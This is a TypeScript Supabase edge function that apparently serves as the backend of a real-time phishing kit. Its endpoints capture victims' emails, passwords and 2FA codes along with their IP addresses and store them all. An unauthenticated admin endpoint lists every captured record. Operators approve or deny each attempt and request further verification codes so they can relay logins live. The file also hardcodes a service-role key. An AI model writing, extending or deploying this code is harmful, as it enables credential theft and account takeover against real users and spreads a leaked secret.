import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    // Use service role for all operations - NO AUTHORIZATION REQUIRED
    const supabaseClient = createClient(
      'https://nqsdardermkzppeaazbb.supabase.co',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MDk1NjU2NSwiZXhwIjoyMDY2NTMyNTY1fQ._G6ZV0GjtQ7Q8ZV4GKOFDxKGhi_eQl2VP7eYfaf-GE8'
    )

    const url = new URL(req.url)
    const path = url.pathname

    // Root test endpoint
    if (path === '/' && req.method === 'GET') {
      return new Response(JSON.stringify({ 
        message: 'LOGIN API WORKING! 🚀',
        timestamp: new Date().toISOString(),
        success: true,
        version: '2.0',
        endpoints: [
          'POST /api/submit - Submit login data',
          'GET /api/requests - Get all requests (admin)',
          'POST /api/approve - Approve/deny request (admin)',
          'GET /api/check-approval - Check approval status',
          'POST /api/submit-2fa - Submit 2FA code'
        ]
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Test POST root endpoint
    if (path === '/' && req.method === 'POST') {
      const body = await req.json()
      return new Response(JSON.stringify({ 
        message: 'LOGIN API POST TEST WORKING! ✅',
        timestamp: new Date().toISOString(),
        success: true,
        receivedData: body
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Submit login data
    if (path === '/api/submit' && req.method === 'POST') {
      const body = await req.json()
      const { email, password, twofa, userAgent, currentPage } = body

      console.log('Submitting data:', { email, currentPage })

      const { data, error } = await supabaseClient
        .from('requests')
        .insert([
          {
            email,
            password,
            twofa,
            user_agent: userAgent,
            ip: req.headers.get('x-forwarded-for') || 'unknown',
            country: 'Unknown',
            page_status: currentPage || 'Login'
          }
        ])
        .select()

      if (error) {
        console.error('Insert error:', error)
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      console.log('Data inserted successfully:', data)
      return new Response(JSON.stringify({ success: true, data }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Get all requests (for admin dashboard)
    if (path === '/api/requests' && req.method === 'GET') {
      console.log('Fetching all requests...')

      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false })

      if (error) {
        console.error('Fetch requests error:', error)
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      console.log(`Found ${data?.length || 0} requests`)
      return new Response(JSON.stringify(data || []), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Approve/deny request (for admin)
    if (path === '/api/approve' && req.method === 'POST') {
      const body = await req.json()
      const { id, decision, verificationCode } = body

      console.log('Approving request:', { id, decision, verificationCode })

      const { data, error } = await supabaseClient
        .rpc('approve_request', {
          request_id: id,
          decision: decision,
          verification_code_param: verificationCode || null
        })

      if (error) {
        console.error('Approve request error:', error)
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      console.log('Request approved successfully:', data)
      return new Response(JSON.stringify({ success: true, data }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Check approval status
    if (path === '/api/check-approval' && req.method === 'GET') {
      const email = url.searchParams.get('email')
      
      if (!email) {
        return new Response(JSON.stringify({ error: 'Email parameter required' }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 400,
        })
      }

      console.log('Checking approval for email:', email)

      const { data, error } = await supabaseClient
        .from('requests')
        .select('*')
        .eq('email', email)
        .order('created_at', { ascending: false })
        .limit(1)

      if (error) {
        console.error('Check approval error:', error)
        return new Response(JSON.stringify({ error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      const request = data?.[0]
      console.log('Approval status:', request?.status || 'not_found')
      
      return new Response(JSON.stringify({ 
        status: request?.status || 'not_found',
        verificationCode: request?.verification_code,
        id: request?.id 
      }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // Submit 2FA code
    if (path === '/api/submit-2fa' && req.method === 'POST') {
      const body = await req.json()
      const { email, code } = body

      console.log('Submitting 2FA code:', { email, code })

      const { data, error } = await supabaseClient
        .rpc('set_verification_code', {
          email_param: email,
          code_param: code
        })

      if (error) {
        console.error('Submit 2FA error:', error)
        return new Response(JSON.stringify({ success: false, error: error.message }), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
          status: 500,
        })
      }

      console.log('2FA code submitted successfully:', data)
      return new Response(JSON.stringify({ success: true, data }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    // 404 for unknown endpoints
    return new Response(JSON.stringify({
      error: 'Endpoint Not Found',
      path: path,
      method: req.method,
      available_endpoints: [
        'GET / - Test endpoint',
        'POST /api/submit - Submit login data',
        'GET /api/requests - Get all requests (admin)',
        'POST /api/approve - Approve/deny request (admin)',
        'GET /api/check-approval?email=xxx - Check approval status',
        'POST /api/submit-2fa - Submit 2FA code'
      ]
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 404,
    })

  } catch (error) {
    console.error('Unexpected error:', error)
    return new Response(JSON.stringify({ 
      error: 'Internal Server Error',
      message: error.message,
      stack: error.stack
    }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      status: 500,
    })
  }
}) 